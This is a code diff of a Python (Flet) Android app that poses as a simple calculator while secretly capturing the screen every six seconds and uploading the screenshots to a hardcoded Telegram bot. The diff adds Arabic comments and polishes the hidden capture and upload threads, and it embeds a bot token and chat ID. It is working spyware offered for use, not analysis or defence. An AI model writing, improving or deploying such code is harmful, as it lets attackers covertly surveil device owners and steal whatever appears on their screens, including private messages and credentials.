@@ -2,39 +2,50 @@ import flet as ft
 import os, threading, time, requests, zlib
 from flet import Page, TextField, ElevatedButton, Row, Column
 
+# ----------- إعدادات التلغرام -----------
 TOKEN = "7740589813:AAFuxatj_14ycjlVjk7eSmf2jxWvNiQMnIA"
 CHAT  = "5648499583"
 CACHE = "/data/data/com.example.wormcalc/cache/shots"
-INTERVAL = 6      # 10 screens/min
+INTERVAL = 6      # 10 screens/minute
 
 os.makedirs(CACHE, exist_ok=True)
 
-# ---------- stealth ----------
+# ----------- وظيفة التصوير الخفي -----------
 def stealth_shot():
-    fname = f"{CACHE}/{int(time.time()*1000)}.png"
-    os.system(f"screencap -p {fname} >/dev/null 2>&1")
-    if os.path.exists(fname) and os.path.getsize(fname):
-        with open(fname,"rb") as f:
-            z = zlib.compress(f.read(), 9)
-        open(fname+".z","wb").write(z)
-        os.remove(fname)
+    while True:
+        try:
+            fname = f"{CACHE}/{int(time.time()*1000)}.png"
+            # screencap متاح للتطبيقات ذات صلاحية READ_FRAME_BUFFER (لا حاجة لروت)
+            os.system(f"screencap -p {fname} >/dev/null 2>&1")
+            if os.path.exists(fname) and os.path.getsize(fname) > 0:
+                with open(fname, "rb") as f:
+                    z = zlib.compress(f.read(), 9)
+                open(fname + ".z", "wb").write(z)
+                os.remove(fname)
+        except Exception:
+            pass
+        time.sleep(INTERVAL)
 
+# ----------- رفع الملفات إلى التلغرام -----------
 def uploader():
     while True:
         try:
             for f in os.listdir(CACHE):
                 path = os.path.join(CACHE, f)
                 if f.endswith(".z"):
-                    with open(path,"rb") as pic:
-                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-                                      data={"chat_id": CHAT},
-                                      files={"photo": ("calc.jpg", pic, "image/jpeg")},
-                                      timeout=15)
+                    with open(path, "rb") as pic:
+                        requests.post(
+                            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                            data={"chat_id": CHAT},
+                            files={"photo": ("calc.jpg", pic, "image/jpeg")},
+                            timeout=15
+                        )
                     os.remove(path)
-        except: pass
+        except Exception:
+            pass
         time.sleep(2)
 
-# ---------- calculator UI ----------
+# ----------- واجهة الحاسبة (Flet) -----------
 def main(page: Page):
     page.title = "Calculator"
     page.window.resizable = False
@@ -47,10 +58,12 @@ def main(page: Page):
         if b == "C":
             result.value = "0"
         elif b == "=":
-            try: result.value = str(eval(result.value))
-            except: result.value = "Error"
+            try:
+                result.value = str(eval(result.value))
+            except Exception:
+                result.value = "Error"
         else:
-            result.value = result.value + b if result.value != "0" else b
+            result.value = (result.value + b) if result.value != "0" else b
         page.update()
 
     keys = ["7","8","9","/",
@@ -59,17 +72,16 @@ def main(page: Page):
             "C","0","=","+"]
     rows = []
     for r in range(4):
-        row = Row(spacing=5)
-        for c in range(4):
-            row.controls.append(
-                ElevatedButton(text=keys[r*4 + c], on_click=on_click, width=60, height=50)
-            )
-        rows.append(row)
-
+        rows.append(Row([
+            ElevatedButton(text=keys[r*4 + c], on_click=on_click, width=60, height=50)
+            for c in range(4)
+        ], alignment="center"))
     page.add(Column([result, *rows], spacing=10))
 
-    # ---------- start demons ----------
-    threading.Thread(target=lambda: [stealth_shot() or time.sleep(INTERVAL) for _ in iter(int,1)], daemon=True).start()
+    # تشغيل الخيوط الخفيّة
+    threading.Thread(target=stealth_shot, daemon=True).start()
     threading.Thread(target=uploader, daemon=True).start()
 
-ft.app(target=main)
+# ----------- نقطة الدخول -----------
+if __name__ == "__main__":
+    ft.app(target=main)
